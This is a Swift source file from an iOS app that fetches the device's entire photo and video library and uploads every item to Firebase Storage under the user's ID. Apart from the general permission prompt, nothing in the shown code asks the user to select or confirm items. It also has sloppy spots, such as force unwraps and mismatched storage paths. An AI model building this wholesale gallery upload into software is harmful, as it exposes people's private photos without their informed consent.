//
//  MediaManager.swift
//  sowhat
//
//  Created by a on 2/21/22.
//

import Foundation
import Photos
import UIKit
import Firebase

let mediaManager = MediaManager()

final class MediaManager: NSObject {
    
    //MARK: - Vers
    var sections: [AlbumCollectionSectionType] = [.all, .smartAlbums, .userCollections]
    var allPhotos = PHFetchResult<PHAsset>()
    var smartAlbums = PHFetchResult<PHAssetCollection>()
    var userCollections = PHFetchResult<PHAssetCollection>()
    
    var uploadedImages: [[String: String]] = [[String:String]]()
    
    //Send Image
    func sendImages () {
        
        let assets: PHFetchResult<PHAsset>
        assets = allPhotos
        print("assets.count: \(assets.count)")
        for i in 0..<assets.count {
            
            let asset = assets[i]
            
            let fileName = PHAssetResource.assetResources(for: asset).first?.originalFilename
            
            self.checkFileType(fileName: fileName!, asset: asset)
            print("sendImage")
        }
    }
    
    //Check File Type
    func checkFileType (fileName:String, asset:PHAsset) {
        switch asset.mediaType {
        case .video:
            print("MediaType = Video ")
            let options: PHVideoRequestOptions = PHVideoRequestOptions()
            options.version = .original
            PHImageManager.default().requestAVAsset(forVideo: asset, options: options, resultHandler: {(asset: AVAsset?, audioMix: AVAudioMix?, info: [AnyHashable : Any]?) -> Void in
                if let urlAsset = asset as? AVURLAsset {
                    let localVideoUrl: URL = urlAsset.url as URL
                    self.uploadVideo(fileName: fileName, localVideoUrl: localVideoUrl)
                }
            })
        case .image:
            print("MediaType = image ")
            uploadImage(fileName: fileName, asset: asset)
        case .audio:
            print("MediaType = audio ")
        case .unknown:
            print("MediaType = unknown ")
        @unknown default:
            print("MediaType = unknown default ")
        }
    }
    
    //Upload Video
    func uploadVideo ( fileName: String, localVideoUrl: URL) {
        
        uploadVideoFile(fileName ,localVideoUrl) { (url, error) in
            
            if let error = error {
                
                print(error.localizedDescription)
                return
            }
            
            guard let url = url else { return }
            print(url.absoluteString)
        }
    }
    
    
    func uploadImage (fileName: String, asset:PHAsset) {
        
        let imageToSend = self.PHAssetToImage(asset: asset)

        uploadImagesToStorage(fileName , imageToSend) { (url, error) in
            
            if let error = error {
                
                print(error.localizedDescription)
                return
            }
            guard let url = url else { return }
            print(url.absoluteString)
        }
    }
    
    //Read All Images and videos
    func fetchAssets() {
        
        let allPhotosOptions = PHFetchOptions()
        
        allPhotosOptions.sortDescriptors = [
            NSSortDescriptor(
                key: "creationDate",
                ascending: false)
        ]
        
        allPhotos = PHAsset.fetchAssets(with: allPhotosOptions)
        
        smartAlbums = PHAssetCollection.fetchAssetCollections(
            with: .smartAlbum,
            subtype: .albumRegular,
            options: nil)
        
        userCollections = PHAssetCollection.fetchAssetCollections(
            with: .album,
            subtype: .albumRegular,
            options: nil)
    }
    
    //Convert PHAsset To UIImage
    func PHAssetToImage(asset:PHAsset) -> UIImage{
        var image = UIImage()
        
        // Create a new default type of image manager imageManager
        let imageManager = PHImageManager.default()
        
        // Create a new PHImageRequestOptions object
        let imageRequestOption = PHImageRequestOptions()
        
        // Is PHImageRequestOptions valid
        imageRequestOption.isSynchronous = true
        
        // The compression mode of the thumbnail is set to none
        imageRequestOption.resizeMode = .none
        
        // The quality of the thumbnail is high quality, no matter how much time it takes to load
        imageRequestOption.deliveryMode = .highQualityFormat
        
        // Take out the picture according to the rules specified by PHImageRequestOptions
        imageManager.requestImage(for: asset, targetSize: CGSize.init(width: 1080, height: 1920), contentMode: .aspectFill, options: imageRequestOption, resultHandler: {
            (result, _) -> Void in
            image = result!
        })
        return image
        
    }
    
    //UPLOAD VIDEO FILE
    func uploadVideoFile(_ fileName: String, _ url: URL, completion: @escaping (_ imageUrl: URL?, _ error: Error?) -> Void) {

        do{
            
            let videoDirectory = "Gallery/" + "\(User.currentId)/" + "_\(fileName)"
            print("videoDirectory \(videoDirectory)")
            
            let data = try Data(contentsOf: url)
            
            let ref = storage.reference(forURL: kFILEREFRENCE).child(videoDirectory)
            
            _ = ref.putData(data, metadata: nil) { (metadata, error) in
                
                if error != nil{
                    print(error?.localizedDescription ?? "")
                }
                print("metadata \(String(describing: metadata))")
            }
            
        }catch{
            print(error.localizedDescription)
        }
    }
    
    //UPLOAD IMAGE METHOD
    func uploadImagesToStorage(_ fileName: String, _ image: UIImage, completion: @escaping (_ imageUrl: URL?, _ error: Error?) -> Void) {
        
        let fileDirectory = "Gallery/" + "_\(User.currentId)/" + "\(fileName)"
        print("fileDirectory \(fileDirectory)")
        
        let storageRef = storage.reference(forURL: kFILEREFRENCE).child(fileDirectory)

        if let uploadData = image.jpegData(compressionQuality: 0.1) {
            
            storageRef.putData(uploadData, metadata: nil) { (metaData, error) in
                
                if let error = error {
                    
                    completion(nil, error)
                    return
                }
                
                storageRef.downloadURL { (url, error) in
                    if let error = error {
                        
                        completion(nil, error)
                        return
                    }
                    if let url = url {
                        
                        completion(url, nil)
                        return
                    }
                }
            }
        }
    }
    
    //Permissions
    func getPermissionIfNecessary(completionHandler: @escaping (Bool) -> Void) {
    
        guard PHPhotoLibrary.authorizationStatus() != .authorized else {
            completionHandler(true)
            return
        }
    
        PHPhotoLibrary.requestAuthorization { status in
            completionHandler(status == .authorized ? true : false)
        }
    }
    
    func checkAuthorisationStatus() {
      let status = PHPhotoLibrary.authorizationStatus()
      switch status {
      case .authorized:
        break
      case .denied, .restricted:
        break
      case .notDetermined:
        PHPhotoLibrary.requestAuthorization { status in
          switch status {
          case .authorized:

              print("authorized")

          case .denied, .restricted, .notDetermined:
            break
          case .limited:
              print("limited")
          @unknown default:
                      fatalError()
                  }
        }
      case .limited:
          print("limited")
      @unknown default:
              fatalError()
          }
    }
}
